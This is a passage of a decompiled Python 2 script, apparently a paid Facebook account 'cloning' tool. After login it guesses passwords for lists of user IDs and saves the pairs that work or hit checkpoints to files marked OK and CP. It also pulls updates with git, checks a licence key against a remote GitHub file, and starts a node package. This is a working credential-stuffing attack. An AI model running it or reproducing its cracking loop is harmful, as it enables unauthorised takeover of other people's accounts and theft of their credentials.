...
# Embedded file name: <TEJAS_SINGH>
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Tejas Kumar Singh'
__copyright = 'All rights reserved . Copyright  Tejas'
...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m    DEVELOPED BY TEJAS      \n\x1b[1;92m   DEVELOPED BY TEJAS \n\x1b[1;91m   DEVELOPED BY TEJAS \n\x1b[1;91m  DEVELOPED BY TEJAS \n\x1b[1;97m   TEJAS SINGH \xe2\x80\xa2 TEJAS SINGH \n\x1b[1;97m   TEJAS SINGH \n\x1b[1;94m   TEJAS SINGH \n\x1b[1;94m   TEJAS SINGH \n\x1b[1;93m TEJAS SINGH  \n\x1b[1;96m TEJAS SINGH \n\x1b[1;96m TEJAS SINGH  \n\x1b[1;96m        \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : By Tejas Singh \n\x1b[1;97m\xe2\x9e\xa3 Facebook :- https://www.facebook.com/T3J9S \n\x1b[1;97m\xe2\x9e\xa3 Whatsapp Number :- +917652050611 \n\x1b[1;91m-----------------------------------------------'

def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1m First Indian Clonning Command'
    print '\x1b[1;31;1m Pay Rs.500 for unlimited Use'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/tejas.txt','r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/tejaskumarsingh/keys/main/tejas_server.txt').text
    if to in r:
        os.system('cd TEJAS_INDIAN_PACKAGE && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd TEJAS_INDIAN_PACKAGE && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        ...
        print ' \x1b[1;92mCopy the id and send to Tejas'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+917652050611')
        reg()
...
def ip():
    ...
    print '\x1b[1;92m Your ip(with VPN): ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country(with VPN): ' + country
    time.sleep(1)
    print '\x1b[1;92m Your region(with VPN): ' + regi
    time.sleep(1)
    print ' \x1b[1;92mYour network(with VPN): ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    log_menu()
...
def log_menu():
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[1;93m ~~~~ Login menu (TEJAS SINGH)~~~~\x1b[1;91m'
        print 47 * '-'
...
def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Tejas >\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def log_fb():
    ...
    try:
        ...
        if 'loc' in q:
            ...
            print 'Verify your login details and try'
            raw_input('\x1b[1;92m Press Enter to login again ')
            log_fb()
        else:
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/tejas.txt', 'r').read()
    print '  \x1b[1;92mLogged in user: \x1b[1;91m' + z
    print 47 * '-'
    print ' \x1b[1;93m Username of Activated Token\x1b[1;91m' + tok
    print ' ------------------------------------------ '
    ...
    print '\x1b[1;92m[6] For New Command Contact Here'
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Tejas >\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Tejas >\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ TEJAS RAJPUT public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mTEJAS SINGH CLONNING\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[TEJAS-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/TEJAS_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[TEJAS-CP] ' + uid + ' | ' + pass1
                cp = open('TEJAS_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[TEJAS-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/TEJAS_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[TEJAS-CP] ' + uid + ' | ' + pass2
                    cp = open('TEJAS_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[TEJAS-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/TEJAS_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[TEJAS-CP] ' + uid + ' | ' + pass3
                        cp = open('TEJAS_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[TEJAS-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/TEJAS_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[TEJAS-CP] ' + uid + ' | ' + pass4
                            cp = open('TEJAS_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    print ' \x1b[1;92mTotal TEJAS Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mTEJAS SINGH\x1b[1;91m'
    print 47 * '-'
    ...
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print '\x1b[1;92m Total TEJAS Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
